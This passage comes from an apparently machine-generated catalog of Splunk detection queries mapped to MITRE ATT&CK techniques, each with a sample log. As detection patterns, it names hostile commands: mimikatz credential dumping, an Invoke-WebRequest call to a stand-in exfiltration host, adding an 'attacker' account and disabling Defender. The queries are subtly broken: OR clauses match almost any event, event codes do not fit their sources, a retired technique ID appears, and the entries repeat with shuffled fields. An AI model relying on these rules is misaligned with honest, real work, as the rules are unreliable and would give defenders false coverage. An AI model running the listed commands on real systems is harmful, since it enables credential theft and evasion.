  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.101",
  "DestinationPort": "3389"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:30:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.115",
  "DestinationPort": "80"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:35:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.101",
  "DestinationPort": "8080"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:40:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.146",
  "DestinationPort": "445"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:45:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.104",
  "DestinationPort": "8443"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:50:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.131",
  "DestinationPort": "443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 83"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:55:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 83",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.133",
  "DestinationPort": "3389"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:00:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.149",
  "DestinationPort": "8080"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:05:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.110",
  "DestinationPort": "8080"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:10:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.116",
  "DestinationPort": "22"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:15:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.145",
  "DestinationPort": "8080"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:20:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.139",
  "DestinationPort": "445"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:25:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.147",
  "DestinationPort": "443"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:30:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.101",
  "DestinationPort": "3389"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:35:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.149",
  "DestinationPort": "8080"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:40:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.104",
  "DestinationPort": "80"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 93"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:45:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 93",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.143",
  "DestinationPort": "3389"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:50:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.109",
  "DestinationPort": "445"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 21:55:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.106",
  "DestinationPort": "8443"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 22:00:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.120",
  "DestinationPort": "443"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 22:05:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.105",
  "DestinationPort": "8443"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 22:10:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.114",
  "DestinationPort": "80"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 22:15:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.121",
  "DestinationPort": "22"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:00:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.103",
  "DestinationPort": "8443"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:02:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.143",
  "DestinationPort": "3389"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:04:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.150",
  "DestinationPort": "443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 3"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:06:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 3",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.144",
  "DestinationPort": "22"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:08:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.143",
  "DestinationPort": "445"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:10:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.116",
  "DestinationPort": "445"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:12:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.114",
  "DestinationPort": "3389"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:14:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.138",
  "DestinationPort": "80"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:16:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.131",
  "DestinationPort": "80"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:18:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.112",
  "DestinationPort": "8443"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:20:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.130",
  "DestinationPort": "22"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:22:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.114",
  "DestinationPort": "80"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:24:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.108",
  "DestinationPort": "22"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 13"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:26:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 13",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.129",
  "DestinationPort": "443"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:28:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.104",
  "DestinationPort": "445"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:30:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.124",
  "DestinationPort": "445"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
